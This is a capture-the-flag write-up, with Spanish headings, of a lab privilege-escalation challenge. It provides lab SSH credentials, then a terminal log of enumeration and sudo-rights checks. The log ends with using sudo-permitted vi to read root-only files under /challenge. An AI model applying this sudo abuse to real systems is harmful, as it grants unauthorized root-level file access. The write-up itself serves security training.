## Descripción
Can you read files in the root file? The system admin has provisioned an account for you on the main server:

`ssh -p 20566 picoplayer@xebec.cylabacademy.net`

Password: `Fsz7lEf9jG`

Can you login and read the root file?

Instance

Expires in 14:54

Hints

1

What permissions do you have?

## Solución
```
Dark23-academy@webshell:~$ ssh -p 20566 picoplayer@xebec.cylabacademy.net
The authenticity of host '[xebec.cylabacademy.net]:20566 ([77.113.98.131]:20566)' can't be established.
ED25519 key fingerprint is SHA256:PjiSQ+uSeS96qhxcuk5fg4WCew4G3ptxW6ZEzXTp54k.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[xebec.cylabacademy.net]:20566' (ED25519) to the list of known hosts.
picoplayer@xebec.cylabacademy.net's password: 
Permission denied, please try again.
picoplayer@xebec.cylabacademy.net's password: 
Permission denied, please try again.
picoplayer@xebec.cylabacademy.net's password: 
picoplayer@xebec.cylabacademy.net: Permission denied (publickey,password).
Dark23-academy@webshell:~$ ssh -p 20566 picoplayer@xebec.cylabacademy.net
picoplayer@xebec.cylabacademy.net's password: 
Permission denied, please try again.
picoplayer@xebec.cylabacademy.net's password: 
Permission denied, please try again.
picoplayer@xebec.cylabacademy.net's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1018-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ whoami
id
pwd
picoplayer
uid=1001(picoplayer) gid=1001(picoplayer) groups=1001(picoplayer)
/home/picoplayer
picoplayer@challenge:~$ ls -ld /root 
ls -la /
drwx------ 1 root root 23 Sep 23 04:39 /root
total 0
drwxr-xr-x   1 root   root     51 Nov 20 23:47 .
drwxr-xr-x   1 root   root     51 Nov 20 23:47 ..
-rwxr-xr-x   1 root   root      0 Nov 20 23:47 .dockerenv
lrwxrwxrwx   1 root   root      7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 22  2024 boot
d---------   1 root   root     27 Sep 23 04:39 challenge
drwxr-xr-x   5 root   root    340 Nov 20 23:47 dev
drwxr-xr-x   1 root   root     66 Nov 20 23:47 etc
drwxr-xr-x   1 root   root     24 Sep 23 04:38 home
lrwxrwxrwx   1 root   root      7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root   root      6 Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx   1 root   root      9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root   root      6 Aug 10 14:48 media
drwxr-xr-x   2 root   root      6 Aug 10 14:48 mnt
drwxr-xr-x   2 root   root      6 Aug 10 14:48 opt
dr-xr-xr-x 284 nobody nogroup   0 Nov 20 23:47 proc
drwx------   1 root   root     23 Sep 23 04:39 root
drwxr-xr-x   1 root   root     42 Nov 20 23:49 run
lrwxrwxrwx   1 root   root      8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Aug 10 14:48 srv
dr-xr-xr-x  13 nobody nogroup   0 Nov 19 22:26 sys
drwxrwxrwt   1 root   root      6 Sep 23 04:38 tmp
drwxr-xr-x   1 root   root     18 Aug 10 14:48 usr
drwxr-xr-x   1 root   root     17 Aug 10 14:55 var
picoplayer@challenge:~$ ls -la /root
ls: cannot open directory '/root': Permission denied
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Sorry, try again.
[sudo] password for picoplayer: 
Matching Defaults entries for
    picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User picoplayer may run the
        following commands on
        challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ ls -ld /challenge
d--------- 1 root root 27 Sep 23 04:39 /challenge


sudo /usr/bin/vi

:e /challenge/*

```
## Notas Adicionales
## Referencias

